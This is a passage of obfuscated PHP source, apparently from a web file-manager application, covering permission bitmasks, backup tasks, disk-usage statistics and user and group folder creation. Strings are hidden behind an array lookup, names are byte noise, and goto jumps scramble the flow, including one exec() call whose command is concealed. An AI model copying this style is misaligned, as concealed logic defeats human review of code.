$f±†’ãù²Ğ[1626] => (int) $dÊ”îœ¶Ù¬, $f±†’ãù²Ğ[1627] => ucfirst($aõ‚¹Ù“…ä), $f±†’ãù²Ğ[1628] => $f±†’ãù²Ğ[1629] . PHP_VERSION, $f±†’ãù²Ğ[1630] => phpBuild64() ? 64 : 32, $f±†’ãù²Ğ[688] => str_replace($f±†’ãù²Ğ[1631], $f±†’ãù²Ğ[900], $f—…×ñÌ„¾), $f±†’ãù²Ğ[345] => ucfirst($CĞ†æÂàŸ), $f±†’ãù²Ğ[28] => $_SERVER[$f±†’ãù²Ğ[1632]]); goto b¸¿˜‹ªÕ¯; DñĞ¡ŸŠ³: $E…Û¥é’–† = array($f±†’ãù²Ğ[737] => $AÏµÒ°ˆÒ[$f±†’ãù²Ğ[385]]); $dÊ”îœ¶Ù¬ = Model($f±†’ãù²Ğ[439])->where($E…Û¥é’–†)->sum($f±†’ãù²Ğ[77]); $a²²©‚‡“Š = explode($f±†’ãù²Ğ[50], $_SERVER[$f±†’ãù²Ğ[141]]); goto C“Ğº²×‘±; fŠ˜ƒİ†‚…: $f±†’ãù²Ğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¶¦‡‹‘ë = $this->diskDriver(); $AÏµÒ°ˆÒ = KodIO::defaultDriver(); goto DñĞ¡ŸŠ³; b¸¿˜‹ªÕ¯: } private function diskDriver() { goto fÈ¶Ç‹õÒ¶; fÈ¶Ç‹õÒ¶: $CÑæ”ĞÊ„î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FàŠ¢¢óÚî = $CÑæ”ĞÊ„î[8]; $D’í¯„½Š = $GLOBALS[$CÑæ”ĞÊ„î[6]][$CÑæ”ĞÊ„î[1633]] == $CÑæ”ĞÊ„î[1634]; goto eøØ£½»¥; D‚ÅÒ—†ë“: $aĞÇÏÃÈéÔ = $A¸ğŸÉ÷ïÈ - @disk_free_space($FàŠ¢¢óÚî); return array($CÑæ”ĞÊ„î[1622] => $A¸ğŸÉ÷ïÈ, $CÑæ”ĞÊ„î[1624] => $aĞÇÏÃÈéÔ); goto Dè¬ª‹õ™æ; eøØ£½»¥: if ($D’í¯„½Š) { $FàŠ¢¢óÚî = $CÑæ”ĞÊ„î[1635]; if (function_exists($CÑæ”ĞÊ„î[1636])) { exec($CÑæ”ĞÊ„î[1637], $eÅ´¨ÂôŠƒ); $FàŠ¢¢óÚî = $eÅ´¨ÂôŠƒ[1] . $CÑæ”ĞÊ„î[8]; } } if (!file_exists($FàŠ¢¢óÚî)) { return; } $A¸ğŸÉ÷ïÈ = @disk_total_space($FàŠ¢¢óÚî); goto D‚ÅÒ—†ë“; Dè¬ª‹õ™æ: } public function fileChart($c®–¹´Œ®‹) { goto CöÏİ†º’¬; f•¬¸ÀÊ¡: $cë“á¿ùİ[$BæÉ¬Ëà’Ù[389]] = 2; $e‰¿¥¢—À« = Model($BæÉ¬Ëà’Ù[745])->where($cë“á¿ùİ)->sum($BæÉ¬Ëà’Ù[77]); return array($BæÉ¬Ëà’Ù[692] => $f•°ÊÌˆ[$BæÉ¬Ëà’Ù[77]], $BæÉ¬Ëà’Ù[1568] => $f•°ÊÌˆ[$BæÉ¬Ëà’Ù[1568]], $BæÉ¬Ëà’Ù[1569] => (int) $fÖê¨åÂ‡, $BæÉ¬Ëà’Ù[1570] => (int) $e‰¿¥¢—À«); goto F‰ÑÜ÷Ï¿; CöÏİ†º’¬: $BæÉ¬Ëà’Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($c®–¹´Œ®‹[$BæÉ¬Ëà’Ù[1479]])) { return Model($BæÉ¬Ëà’Ù[745])->userFileTypeProfile($c®–¹´Œ®‹[$BæÉ¬Ëà’Ù[1479]]); } if (isset($c®–¹´Œ®‹[$BæÉ¬Ëà’Ù[1638]])) { return Model($BæÉ¬Ëà’Ù[745])->groupFileTypeProfile($c®–¹´Œ®‹[$BæÉ¬Ëà’Ù[1638]]); } goto Fâç‰…¹á; Fâç‰…¹á: $f•°ÊÌˆ = $this->sourceSize(); $cë“á¿ùİ = array($BæÉ¬Ëà’Ù[479] => 0, $BæÉ¬Ëà’Ù[389] => 1); $fÖê¨åÂ‡ = Model($BæÉ¬Ëà’Ù[745])->where($cë“á¿ùİ)->sum($BæÉ¬Ëà’Ù[77]); goto f•¬¸ÀÊ¡; F‰ÑÜ÷Ï¿: } private function sourceSize() { $Cˆ¨ÃŒÂØ– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F»œĞùªÓŒ = Model($Cˆ¨ÃŒÂØ–[745])->where(array($Cˆ¨ÃŒÂØ–[388] => 0))->sum($Cˆ¨ÃŒÂØ–[77]); $eÄ‘ªÕÆÄ = Model($Cˆ¨ÃŒÂØ–[439])->sum($Cˆ¨ÃŒÂØ–[77]); if ($eÄ‘ªÕÆÄ > $F»œĞùªÓŒ) { $eÄ‘ªÕÆÄ = $F»œĞùªÓŒ; } return array($Cˆ¨ÃŒÂØ–[77] => (int) $F»œĞùªÓŒ, $Cˆ¨ÃŒÂØ–[1568] => (int) $eÄ‘ªÕÆÄ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $BâË¨èåÄÆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A³½¾¤¬š¤ = array(array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1639]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1641], $BâË¨èåÄÆ[1642] => 1, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1645]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1646], $BâË¨èåÄÆ[1642] => 2, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1647]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1648], $BâË¨èåÄÆ[1642] => 3, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1649]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1650], $BâË¨èåÄÆ[1642] => 4, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_VIEW), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1651]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1652], $BâË¨èåÄÆ[1642] => 5, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1653]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1654], $BâË¨èåÄÆ[1642] => 6, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($BâË¨èåÄÆ[404] => LNG($BâË¨èåÄÆ[1655]), $BâË¨èåÄÆ[1640] => $BâË¨èåÄÆ[1656], $BâË¨èåÄÆ[1642] => 7, $BâË¨èåÄÆ[1643] => 1, $BâË¨èåÄÆ[1644] => 0)); return $A³½¾¤¬š¤; } public static function authCheck($F¯ÛÅÇ³ƒğ, $E†Şê›¨—Ù) { $F¯ÛÅÇ³ƒğ = intval($F¯ÛÅÇ³ƒğ); if (_get($GLOBALS, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][475])) { return !0; } if ($F¯ÛÅÇ³ƒğ <= 0) { return !1; } if (($F¯ÛÅÇ³ƒğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($F¯ÛÅÇ³ƒğ & $E†Şê›¨—Ù); } public static function authCheckShow($Bù¶Ûå£Ü ) { return self::authCheck($Bù¶Ûå£Ü , self::AUTH_SHOW); } public static function authCheckView($A‰å¨±†„Î) { return self::authCheck($A‰å¨±†„Î, self::AUTH_VIEW); } public static function authCheckDownload($fæÛã·Š©) { return self::authCheck($fæÛã·Š©, self::AUTH_DOWNLOAD); } public static function authCheckUpload($bç÷ß­Öˆ¹) { return self::authCheck($bç÷ß­Öˆ¹, self::AUTH_UPLOAD); } public static function authCheckEdit($b‹¿‹¼ˆ¿ó) { return self::authCheck($b‹¿‹¼ˆ¿ó, self::AUTH_EDIT); } public static function authCheckRemove($f¶ÇÕ¤˜¦Ÿ) { return self::authCheck($f¶ÇÕ¤˜¦Ÿ, self::AUTH_REMOVE); } public static function authCheckShare($B¢È„ø¤ì) { return self::authCheck($B¢È„ø¤ì, self::AUTH_SHARE); } public static function authCheckComment($fİ…¾ñ¬¾ô) { return self::authCheck($fİ…¾ñ¬¾ô, self::AUTH_COMMENT); } public static function authCheckEvent($AùöøŒÇÓÄ) { return self::authCheck($AùöøŒÇÓÄ, self::AUTH_EVENT); } public static function authCheckRoot($DÂÒË—…ÑË) { return self::authCheck($DÂÒË—…ÑË, self::AUTH_ROOT); } public static function authCheckAction($cï‹Èñ–, $E•ÅâùÍ­†) { goto bŠöáÌ¥—; BÈÀÂÔ›¸‡: $cÂ±ùÂ¨ï¸ = $CœÍ’“Ş[$E•ÅâùÍ­†]; $cï‹Èñ– = intval($cï‹Èñ–); if ($cï‹Èñ– <= 0) { return !1; } goto b‡ÖÌœºÓÁ; bŠöáÌ¥—: $AõÂôø”îÅ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CœÍ’“Ş = array($AõÂôø”îÅ[1657] => self::AUTH_VIEW, $AõÂôø”îÅ[1045] => self::AUTH_DOWNLOAD, $AõÂôø”îÅ[106] => self::AUTH_UPLOAD, $AõÂôø”îÅ[1605] => self::AUTH_EDIT, $AõÂôø”îÅ[1604] => self::AUTH_REMOVE, $AõÂôø”îÅ[1615] => self::AUTH_SHARE, $AõÂôø”îÅ[350] => self::AUTH_COMMENT, $AõÂôø”îÅ[1468] => self::AUTH_EVENT, $AõÂôø”îÅ[1658] => self::AUTH_ROOT); if (!isset($CœÍ’“Ş[$E•ÅâùÍ­†])) { return; } goto BÈÀÂÔ›¸‡; b‡ÖÌœºÓÁ: if (($cï‹Èñ– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cï‹Èñ– & $cÂ±ùÂ¨ï¸); goto bƒ†Ï¦à¬È; bƒ†Ï¦à¬È: } public static function authDisable($c¯¾–Ê“Úö, $C‚²‚‰ÏÇª) { if (intval($c¯¾–Ê“Úö) <= 0) { return 0; } return intval($c¯¾–Ê“Úö) & ~$C‚²‚‰ÏÇª; } public $optionType = "\x53\171\163\x74\x65\x6d\56\163\x6f\165\162\143\145\101\165\x74\150\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\165\x74\x68", "\154\x61\142\x65\x6c", "\x64\151\x73\160\154\x61\x79", "\x73\171\163\164\145\155", "\x73\x6f\162\x74"); public function initData() { $aÌšáá’Ş = $this->authDefault(); foreach ($aÌšáá’Ş as $b§õ²Ó‘…Š) { $this->add($b§õ²Ó‘…Š); } } public function listData($bÅ™–ë¹ùÛ = false, $bÃ¢òéÖÃî = "\x73\x6f\x72\x74", $Fø³¬ïäÈ = false) { return parent::listData($bÅ™–ë¹ùÛ, $bÃ¢òéÖÃî, $Fø³¬ïäÈ); } public function update($B“›†—ïõ“, $aº±¢š÷) { $FŒ†›ÑŒ³š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FôˆÔ†¿âÆ = parent::listData($B“›†—ïõ“); $a¦–İ…„¡ = $this->findByName($aº±¢š÷[$FŒ†›ÑŒ³š[28]]); if (!$FôˆÔ†¿âÆ || $a¦–İ…„¡ && $a¦–İ…„¡[$FŒ†›ÑŒ³š[385]] != $FôˆÔ†¿âÆ[$FŒ†›ÑŒ³š[385]]) { return !1; } $this->filterAuth($aº±¢š÷[$FŒ†›ÑŒ³š[394]]); return parent::update($B“›†—ïõ“, $aº±¢š÷); } public function remove($c—Ú†´‚¥¦) { $D„ñ½ˆ±Ú… = parent::listData($c—Ú†´‚¥¦); if (!$D„ñ½ˆ±Ú… || $D„ñ½ˆ±Ú…[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1118]]) { return !1; } return parent::remove($c—Ú†´‚¥¦); } public function add($cÍ¨¸ß¬¼½ = array()) { goto BÁšÈ„Ì’‰; aİ”² é³: $cÍ¨¸ß¬¼½ = array_merge($b´¸©´ãéŠ, $cÍ¨¸ß¬¼½); $cÍ¨¸ß¬¼½[$a «ƒøñ­‹[1661]] = $this->getSort(); $this->filterAuth($cÍ¨¸ß¬¼½[$a «ƒøñ­‹[394]]); goto D¹ô¡½‡™Ã; D¹ô¡½‡™Ã: return parent::insert($cÍ¨¸ß¬¼½); goto D“êñ¢´Ä; BÁšÈ„Ì’‰: $a «ƒøñ­‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->findByName($cÍ¨¸ß¬¼½[$a «ƒøñ­‹[28]])) { return !1; } $b´¸©´ãéŠ = array($a «ƒøñ­‹[28] => $a «ƒøñ­‹[33], $a «ƒøñ­‹[394] => 1, $a «ƒøñ­‹[1659] => $a «ƒøñ­‹[1648], $a «ƒøñ­‹[1660] => 1, $a «ƒøñ­‹[1118] => 0, $a «ƒøñ­‹[1661] => 0); goto aİ”² é³; D“êñ¢´Ä: } private function getSort() { $bøŠ»ğöÅ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AŠï¦æËŠ = parent::listData(); $cë¯ª¼¯¦… = array_to_keyvalue($AŠï¦æËŠ, $bøŠ»ğöÅ¯[33], $bøŠ»ğöÅ¯[1661]); return empty($cë¯ª¼¯¦…) ? 0 : max($cë¯ª¼¯¦…) + 1; } private function filterAuth(&$fŠ™Š¼Ø×í) { goto aÙìÚŸ½Ïò; Eóä¾‚Óæô: foreach ($d¾±ê¼Û as $C†ß ¢æù…) { if (isset($e¾¯‚•ÀÎ[$C†ß ¢æù…])) { $d¾±ê¼Û = array_merge($d¾±ê¼Û, $e¾¯‚•ÀÎ[$C†ß ¢æù…]); } } $d¾±ê¼Û[] = self::AUTH_SHOW; $fŠ™Š¼Ø×í = array_sum(array_unique($d¾±ê¼Û)); goto C©’¯Š³ˆ³; aÙìÚŸ½Ïò: if (!$fŠ™Š¼Ø×í) { return; } $eÒùŠ´—Íá = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $d¾±ê¼Û = array(); goto A­­ÕÀ˜š; A­­ÕÀ˜š: foreach ($eÒùŠ´—Íá as $C†ß ¢æù…) { if ($fŠ™Š¼Ø×í & $C†ß ¢æù…) { $d¾±ê¼Û[] = $C†ß ¢æù…; } } if (in_array(self::AUTH_ROOT, $d¾±ê¼Û)) { $fŠ™Š¼Ø×í = array_sum($eÒùŠ´—Íá); return; } $e¾¯‚•ÀÎ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Eóä¾‚Óæô; C©’¯Š³ˆ³: } public function sort($Dçìîğ¿º, $B™ìßêŠª) { return parent::update($Dçìîğ¿º, $B™ìßêŠª); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x62\141\143\153\165\160\114\151\163\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\163\164\141\164\165\x73", "\143\157\x6e\164\145\x6e\164", "\x72\145\163\x75\x6c\164", "\164\151\x6d\x65\x46\162\157\155", "\164\x69\155\145\x54\x6f"); public function config() { goto EŒÅ‰¦±‘‰; eˆ©÷Öƒ: $D‘§«ë”à‘ = is_array($D‘§«ë”à‘) ? $D‘§«ë”à‘ : array(); if (!isset($D‘§«ë”à‘[$A•´ŸÕƒ«¨[686]])) { $D‘§«ë”à‘[$A•´ŸÕƒ«¨[686]] = $A•´ŸÕƒ«¨[86]; } $c•á¡‡»Å = array(); goto d¯Á¸Î¬£†; EŒÅ‰¦±‘‰: $A•´ŸÕƒ«¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D‘§«ë”à‘ = Model($A•´ŸÕƒ«¨[1075])->get($A•´ŸÕƒ«¨[707]); $D‘§«ë”à‘ = json_decode($D‘§«ë”à‘, !0); goto eˆ©÷Öƒ; EÇœ‰Ê÷º‹: if (isset($c•á¡‡»Å[$A•´ŸÕƒ«¨[195]])) { $c•á¡‡»Å[$A•´ŸÕƒ«¨[195]] = json_decode($c•á¡‡»Å[$A•´ŸÕƒ«¨[195]], !0); } if (isset($D‘§«ë”à‘[$A•´ŸÕƒ«¨[195]])) { $c•á¡‡»Å[$A•´ŸÕƒ«¨[195]][$A•´ŸÕƒ«¨[1453]] = $D‘§«ë”à‘[$A•´ŸÕƒ«¨[195]]; unset($D‘§«ë”à‘[$A•´ŸÕƒ«¨[195]]); } return array_merge($c•á¡‡»Å, $D‘§«ë”à‘); goto cœÕòĞø¢è; d¯Á¸Î¬£†: Action($A•´ŸÕƒ«¨[1662])->taskInit(); $fÇ÷ØÅÊğ = Model($A•´ŸÕƒ«¨[1663])->listData(); foreach ($fÇ÷ØÅÊğ as $Fëï±ÀÙí„) { if ($Fëï±ÀÙí„[$A•´ŸÕƒ«¨[1118]] == $A•´ŸÕƒ«¨[86] && $Fëï±ÀÙí„[$A•´ŸÕƒ«¨[1468]] == $A•´ŸÕƒ«¨[1664]) { $c•á¡‡»Å = $Fëï±ÀÙí„; break; } } goto EÇœ‰Ê÷º‹; cœÕòĞø¢è: } public function listData($A‹ß·½ƒš = false, $c¸‚¶“ŠÄ³ = "\x6d\x6f\144\151\x66\x79\x54\x69\x6d\145", $B¬­°ÉôÃ = false) { return parent::listData($A‹ß·½ƒš, $c¸‚¶“ŠÄ³, !0); } public function lastItem() { $c×ìÉ…ˆ† = $this->listData(); return !empty($c×ìÉ…ˆ†[0]) ? $c×ìÉ…ˆ†[0] : null; } public function kill($FÏƒ†‚»Ã) { goto b¬…Ö‹ª‘¡; b¬…Ö‹ª‘¡: $fš¯öÃ´è =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¿«İµš²Ó = $this->listData($FÏƒ†‚»Ã); if (!$B¿«İµš²Ó || empty($B¿«İµš²Ó[$fš¯öÃ´è[28]])) { return !0; } goto Aã¾…Ê ­; Aã¾…Ê ­: Task::kill($fš¯öÃ´è[706]); Task::kill($fš¯öÃ´è[723]); Task::kill($fš¯öÃ´è[730]); goto E´‚ƒË„Ä; E´‚ƒË„Ä: $fİ’¾±†­ = $B¿«İµš²Ó[$fš¯öÃ´è[28]]; $AÚå½‘ê = TEMP_FILES . $fš¯öÃ´è[703] . $fİ’¾±†­ . $fš¯öÃ´è[8]; IO::remove($AÚå½‘ê, !1); goto bÌÛ¸ì˜è; bÌÛ¸ì˜è: return $this->remove($FÏƒ†‚»Ã); goto FÉâ¥õä·¬; FÉâ¥õä·¬: } public function remove($dß¤·Ø“Ÿ•) { $EóéÖ¹‚ï¦ = $this->listData($dß¤·Ø“Ÿ•); if (!$EóéÖ¹‚ï¦) { return !0; } return $this->backupRemove($EóéÖ¹‚ï¦); } private function backupRemove($d™ „®ôø—) { $bÕî»¬æƒá =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::remove($d™ „®ôø—[$bÕî»¬æƒá[385]]); $CšŞîªÁ›ò = "\x7b\x69\x6f\x3a{$d™ „®ôø—[$bÕî»¬æƒá[685]]}\175\57\x64\x61\x74\x61\142\x61\x73\x65\57\x62\x61\x63\x6b\x75\x70\137" . $d™ „®ôø—[$bÕî»¬æƒá[28]]; IO::remove($CšŞîªÁ›ò, !1); return !0; } public function start() { goto cô–›ÜÙ; e™… Ìå¹: if (!$BÑ«’óŸì || $BÑ«’óŸì[$cæŒƒ›†³’[1450]] != $cæŒƒ›†³’[86]) { return !1; } $B¹Üõêò³ö = $this->process(); foreach ($B¹Üõêò³ö as $d†¹»Òî‰ƒ) { if ($d†¹»Òî‰ƒ) { return Task::restart($d†¹»Òî‰ƒ[$cæŒƒ›†³’[385]]); } } goto eòèšÒ¼¬Ë; eòèšÒ¼¬Ë: $D¯ãº»å‹„ = new Backup(); $D¯ãº»å‹„->keep(); $EêÂ¨ÛÍ‡ó = $D¯ãº»å‹„->db(); goto e¶á•¨Ê»; cô–›ÜÙ: $cæŒƒ›†³’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($GLOBALS[$cæŒƒ›†³’[6]][$cæŒƒ›†³’[87]][$cæŒƒ›†³’[1665]] != $cæŒƒ›†³’[86]) { return !0; } $BÑ«’óŸì = $this->config(); goto e™… Ìå¹; e¶á•¨Ê»: if ($EêÂ¨ÛÍ‡ó) { $EêÂ¨ÛÍ‡ó = $D¯ãº»å‹„->dbFile(); if ($EêÂ¨ÛÍ‡ó && $BÑ«’óŸì[$cæŒƒ›†³’[686]] == $cæŒƒ›†³’[486]) { $EêÂ¨ÛÍ‡ó = $D¯ãº»å‹„->file(); } } Backup::set(array($cæŒƒ›†³’[683] => 1, $cæŒƒ›†³’[465] => time())); return !0; goto a‹‹§Ùğ‡; a‹‹§Ùğ‡: } public function process() { $d¯¹œ¢Üêò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($d¯¹œ¢Üêò[688] => Task::get($d¯¹œ¢Üêò[706]), $d¯¹œ¢Üêò[691] => Task::get($d¯¹œ¢Üêò[723]), $d¯¹œ¢Üêò[173] => Task::get($d¯¹œ¢Üêò[730])); } public function restore() { $E˜¾Å¼† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; ActionCall($E˜¾Å¼†[970], !0, 1); ActionCall($E˜¾Å¼†[970], !0, 0); } } goto A™¥†›ß­‘; C–îÜµŠ : class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($A¸ßÑÃÖ…İ) { $D‹™ºÔ›¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dˆÔ†Ã„í“ = Model($D‹™ºÔ›¯[492])->where(array($D‹™ºÔ›¯[1471] => $A¸ßÑÃÖ…İ))->find(); $aÜ··¾Ò¿ó = $this->_mkdirRoot(SourceModel::TYPE_USER, $A¸ßÑÃÖ…İ, $dˆÔ†Ã„í“[$D‹™ºÔ›¯[28]]); $this->userDesktopAdd($aÜ··¾Ò¿ó); return $aÜ··¾Ò¿ó; } public function userDesktopAdd($bŸŠ¢èáÆÖ) { $Bà›‹‰õìğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BĞÒĞõ÷¸Â = LNG($Bà›‹‰õìğ[1897]); $dÍëòÖ‰ôã = $this->mkdir($bŸŠ¢èáÆÖ, $BĞÒĞõ÷¸Â); $this->metaSet($dÍëòÖ‰ôã, $Bà›‹‰õìğ[1898], $Bà›‹‰õìğ[86]); $this->metaSet($bŸŠ¢èáÆÖ, $Bà›‹‰õìğ[1899], $dÍëòÖ‰ôã); } public function groupRootAdd($Dó‰åœº˜Ç) { $B¤´÷ĞÕ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‘à˜Âˆ‚ = Model($B¤´÷ĞÕ[476])->where(array($B¤´÷ĞÕ[1719] => $Dó‰åœº˜Ç))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Dó‰åœº˜Ç, $B‘à˜Âˆ‚[$B¤´÷ĞÕ[28]]); } public function systemRootPathAdd($f‚ÁÌÁÄêƒ) { if ($f‚ÁÌÁÄêƒ != $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1126]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $f‚ÁÌÁÄêƒ); } public function userRootRemove($aò¿†‹£ìŠ) { $câ¸ª³œé´ = $this->sourceRoot(SourceModel::TYPE_USER, $aò¿†‹£ìŠ); if (!$câ¸ª³œé´) { return; } $this->remove($câ¸ª³œé´, !1); } public function groupRootRemove($FÅøÖ‹´›“) { $bø–àŠ“ õ = $this->sourceRoot(SourceModel::TYPE_GROUP, $FÅøÖ‹´›“); if (!$bø–àŠ“ õ) { return; } $this->remove($bø–àŠ“ õ, !1); } private function _mkdirRoot($A ØÊ³ôØ‹, $DÙÌ‰Õ÷õ›, $a³¿È¥ğİ) { goto DÀíÉ‚Ô›; a„’Óô¼éİ: $FÒ…‘Èë‡× = $this->add($B˜Ÿ†£×§); $cÕöÙøİ—Ù = array($b•·‡ÀÙ®[544] => short_id($FÒ…‘Èë‡×)); $this->where(array($b•·‡ÀÙ®[401] => $FÒ…‘Èë‡×))->save($cÕöÙøİ—Ù); goto c©»±ï¹·Š; c©»±ï¹·Š: CacheLock::unlock($c ˆ°Ÿ§); return $FÒ…‘Èë‡×; goto Dš­íèïè; a¶ÂÍˆ¡à­: $c ˆ°Ÿ§ = "\x4d\157\x64\145\154\x53\157\x75\x72\143\x65\x2e\x6d\153\x64\x69\162\x52\157\157\x74\56{$A ØÊ³ôØ‹}\56{$DÙÌ‰Õ÷õ›}\x2e" . $a³¿È¥ğİ; CacheLock::lock($c ˆ°Ÿ§); $B˜Ÿ†£×§[$b•·‡ÀÙ®[28]] = $a³¿È¥ğİ; goto a„’Óô¼éİ; DÀíÉ‚Ô›: $b•·‡ÀÙ® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B˜Ÿ†£×§ = array($b•·‡ÀÙ®[386] => 0, $b•·‡ÀÙ®[538] => $A ØÊ³ôØ‹, $b•·‡ÀÙ®[539] => $DÙÌ‰Õ÷õ›, $b•·‡ÀÙ®[535] => 1, $b•·‡ÀÙ®[540] => USER_ID, $b•·‡ÀÙ®[541] => USER_ID, $b•·‡ÀÙ®[536] => $b•·‡ÀÙ®[33], $b•·‡ÀÙ®[542] => $b•·‡ÀÙ®[488], $b•·‡ÀÙ®[413] => 0, $b•·‡ÀÙ®[537] => 0, $b•·‡ÀÙ®[437] => 0, $b•·‡ÀÙ®[543] => $b•·‡ÀÙ®[33]); if ($F¶Ê„“…Ää = $this->where($B˜Ÿ†£×§)->find()) { return $F¶Ê„“…Ää[$b•·‡ÀÙ®[387]]; } goto a¶ÂÍˆ¡à­; Dš­íèïè: } private function sourceRoot($b‚Ã•Âô±Œ, $d¶ÁĞ ©µ, $C‚«Ç” = false) { $c‰ó’µ‹¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cï™ã¥°º— = array($c‰ó’µ‹¶[386] => 0, $c‰ó’µ‹¶[538] => $b‚Ã•Âô±Œ, $c‰ó’µ‹¶[539] => $d¶ÁĞ ©µ); if ($D¡â‘Ì®ø£ = $this->where($Cï™ã¥°º—)->find()) { return $C‚«Ç” ? $D¡â‘Ì®ø£ : $D¡â‘Ì®ø£[$c‰ó’µ‹¶[387]]; } return !1; } public function sourceRootGroup($Få…êŠÍ†) { $bá™Çà† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_string($Få…êŠÍ†)) { $Få…êŠÍ† = array($Få…êŠÍ†); } $cğ¹•é•Ï = array($bá™Çà†[386] => 0, $bá™Çà†[538] => SourceModel::TYPE_GROUP, $bá™Çà†[539] => array($bá™Çà†[7], $Få…êŠÍ†)); $a·¬£à™„ = $this->listSource($cğ¹•é•Ï, 1000); return array_to_keyvalue($a·¬£à™„[$bá™Çà†[74]], $bá™Çà†[474]); } public function mkfile($BôƒÄˆ­«, $dôä¬ùÚˆƒ, $eÀƒ›…ÛµŞ = '', $F’¤ÔÌï†à = REPEAT_RENAME) { $Aä½—‡Õ­Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D‘Îòä‡àÆ = Model($Aä½—‡Õ­Ì[560])->addFileByContent($eÀƒ›…ÛµŞ, $dôä¬ùÚˆƒ); return $this->_createFileCall($BôƒÄˆ­«, $dôä¬ùÚˆƒ, $D‘Îòä‡àÆ, $F’¤ÔÌï†à, $Aä½—‡Õ­Ì[1166]); } public function addFile($c‰“‚Î°ö, $eèŞãÑ”ÑÔ, $B¨è´êµØ, $D‹îÌñ’ä = false, 